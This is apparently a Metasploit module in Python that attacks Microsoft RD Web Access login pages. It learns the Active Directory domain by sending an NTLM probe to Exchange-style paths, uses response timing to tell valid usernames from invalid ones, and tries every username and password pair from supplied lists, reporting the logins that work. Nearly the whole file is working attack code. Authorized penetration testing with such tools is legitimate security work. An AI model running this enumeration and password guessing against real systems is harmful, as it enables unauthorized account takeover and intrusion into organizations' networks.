#!/usr/bin/env python3
# -*- coding: utf-8 -*-

# standard modules
import base64
import binascii
import itertools
import os
import struct
from metasploit import module

# extra modules
DEPENDENCIES_MISSING = False
try:
    import requests
except ImportError:
    DEPENDENCIES_MISSING = True


# Metasploit Metadata
metadata = {
    'name': 'Microsoft RDP Web Client Login Enumeration',
    'description': '''
        Enumerate valid usernames and passwords against a Microsoft RDP Web Client
        by attempting authentication and performing a timing based check
        against the provided username.
    ''',
    'authors': [
        'Matthew Dunn'
    ],
    'date': '2020-12-23',
    'license': 'MSF_LICENSE',
    'references': [
        {'type': 'url', 'ref': 'https://raxis.com/blog/rd-web-access-vulnerability'},
    ],
    'type': 'single_scanner',
    'options': {
        'targeturi': {'type': 'string',
                      'description': 'The base path to the RDP Web Client install',
                      'required': True, 'default': '/RDWeb/Pages/en-US/login.aspx'},
        'rport': {'type': 'port', 'description': 'Port to target',
                  'required': True, 'default': 443},
        'domain': {'type': 'string', 'description': 'The target AD domain',
                   'required': False, 'default': None},
        'username': {'type': 'string',
                     'description': 'The username to verify or path to a file of usernames',
                     'required': True, 'default': None},
        'password': {'type': 'string',
                     'description': 'The password to try or path to a file of passwords',
                     'required': False, 'default': None},
        'timeout': {'type': 'int',
                    'description': 'Response timeout in milliseconds to consider username invalid',
                    'required': True, 'default': 1250},
        'enum_domain': {'type': 'bool',
                        'description': 'Automatically enumerate AD domain using NTLM',
                        'required': False, 'default': True},
        'verify_service': {'type': 'bool',
                           'description': 'Verify the service is up before performing login scan',
                           'required': False, 'default': True},
        'user_agent': {'type': 'string',
                       'description': 'User Agent string to use, defaults to Firefox',
                       'required': False,
                       'default': 'Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0'}
    }
}


def parse_ntlm_t1(message):
    try:
        message = base64.b64decode(message)
    except binascii.Error:
        return None

    if not message.startswith(b'NTLMSSP\x00\x01\x00\x00\x00'):
        return None
    struct_fmt = '<8xIIHHIHHI'
    size = struct.calcsize(struct_fmt)
    if len(message) < size:
        return None
    fields = struct.unpack(struct_fmt, message[:size])

    properties = {'type': fields[0], 'flags': fields[1]}

    length, _, offset = fields[2:5]
    if len(message) < offset + length:
        return None
    properties['domain'] = message[offset:offset+length].decode('utf-8')

    length, _, offset = fields[5:8]
    if len(message) < offset + length:
        return None
    properties['workstation'] = message[offset:offset+length].decode('utf-8')
    return properties


def verify_service(rhost, rport, targeturi, timeout, user_agent):
    """Verify the service is up at the target URI within the specified timeout"""
    url = 'https://{}:{}/{}'.format(rhost, rport, targeturi)
    headers = {'Host':rhost,
               'User-Agent': user_agent}
    try:
        request = requests.get(url, headers=headers, timeout=(timeout / 1000),
                               verify=False, allow_redirects=False)
        return request.status_code == 200 and 'RDWeb' in request.text
    except requests.exceptions.Timeout:
        return False
    except Exception as exc:
        module.log(str(exc), level='error')
        return False


def get_ad_domain(rhost, rport, user_agent):
    """Retrieve the NTLM domain out of a specific challenge/response"""
    domain_urls = ['aspnet_client', 'Autodiscover', 'ecp', 'EWS', 'OAB',
                   'Microsoft-Server-ActiveSync', 'PowerShell', 'rpc']
    headers = {'Authorization': 'NTLM TlRMTVNTUAABAAAAB4IIogAAAAAAAAAAAAAAAAAAAAAGAbEdAAAADw==',
               'User-Agent': user_agent,
               'Host': rhost}
    session = requests.Session()
    for url in domain_urls:
        target_url = 'https://{}:{}/{}'.format(rhost, rport, url)
        request = session.get(target_url, headers=headers, verify=False)
        # Decode the provided NTLM Response to strip out the domain name
        if request.status_code == 401 and 'WWW-Authenticate' in request.headers and \
          'NTLM' in request.headers['WWW-Authenticate']:
            type1_msg = request.headers['WWW-Authenticate'].split('NTLM ')[1].split(',')[0]
            type1_msg = parse_ntlm_t1(type1_msg)
            if type1_msg is None:
                module.log("NTLM authenticate header was not in the expected format for %s" % url)
                continue
            module.log('Found Domain: {}'.format(type1_msg['domain']), level='good')
            return type1_msg['domain']
    module.log('Failed to find the domain', level='error')
    return None


def check_login(rhost, rport, targeturi, domain, username, password, timeout, user_agent):
    """Check a single login against the RDWeb Client
    The timeout is used to specify the amount of milliseconds where a
    response should consider the username invalid."""

    url = 'https://{}:{}/{}'.format(rhost, rport, targeturi)
    body = 'DomainUserName={}%5C{}&UserPass={}'.format(domain, username, password)
    headers = {'Host':rhost,
               'User-Agent': user_agent,
               'Content-Type': 'application/x-www-form-urlencoded',
               'Content-Length': str(len(body)),
               'Origin': 'https://{}'.format(rhost)}
    session = requests.Session()
    report_data = {'domain':domain, 'address': rhost, 'port': rport,
                   'protocol': 'tcp', 'service_name':'RDWeb'}
    try:
        request = session.post(url, data=body, headers=headers,
                               timeout=(timeout / 1000), verify=False, allow_redirects=False)
        if request.status_code == 302:
            module.log('Login {}\\{}:{} is valid!'.format(domain, username, password), level='good')
            module.report_correct_password(username, password, **report_data)
        elif request.status_code == 200:
            module.log('Password {} is invalid but {}\\{} is valid! Response received in {} milliseconds'.format(password, domain, username, request.elapsed.microseconds / 1000),
                       level='good')
            module.report_valid_username(username, **report_data)
        else:
            module.log('Received unknown response with status code: {}'.format(request.status_code))
    except requests.exceptions.Timeout:
        module.log('Login {}\\{}:{} is invalid! No response received in {} milliseconds'.format(domain, username, password, timeout),
                   level='error')
    except requests.exceptions.RequestException as exc:
        module.log('{}'.format(exc), level='error')
        return


def check_logins(rhost, rport, targeturi, domain, usernames, passwords, timeout, user_agent):
    """Check each username and password combination"""
    for (username, password) in list(itertools.product(usernames, passwords)):
        check_login(rhost, rport, targeturi, domain,
                    username.strip(), password.strip(), timeout, user_agent)

def run(args):
    """Run the module, gathering the domain if desired and verifying usernames and passwords"""
    module.LogHandler.setup(msg_prefix='{} - '.format(args['rhost']))
    if DEPENDENCIES_MISSING:
        module.log('Module dependencies are missing, cannot continue', level='error')
        return

    user_agent = args['user_agent']
    # Verify the service is up if requested
    if args['verify_service']:
        service_verified = verify_service(args['rhost'], args['rport'],
                                          args['targeturi'], int(args['timeout']), user_agent)
        if service_verified:
            module.log('Service is up, beginning scan...', level='good')
        else:
            module.log('Service appears to be down, no response in {} milliseconds'.format(args["timeout"]),
                       level='error')
            return

    # Gather AD Domain either from args or enumeration
    domain = args['domain'] if 'domain' in args else None
    if not domain and args['enum_domain']:
        domain = get_ad_domain(args['rhost'], args['rport'], user_agent)

    # Verify we have a proper domain
    if not domain:
        module.log('Either domain or enum_domain must be set to continue, aborting...',
                   level='error')
        return

    # Gather usernames and passwords for enumeration
    if os.path.isfile(args['username']):
        with open(args['username'], 'r') as file_contents:
            usernames = file_contents.readlines()
    else:
        usernames = [args['username']]
    if 'password' in args and os.path.isfile(args['password']):
        with open(args['password'], 'r') as file_contents:
            passwords = file_contents.readlines()
    elif 'password' in args and args['password']:
        passwords = [args['password']]
    else:
        passwords = ['wrong']
    # Check each valid login combination
    check_logins(args['rhost'], args['rport'], args['targeturi'],
                   domain, usernames, passwords, int(args['timeout']), user_agent)

if __name__ == '__main__':
    module.run(metadata, run)
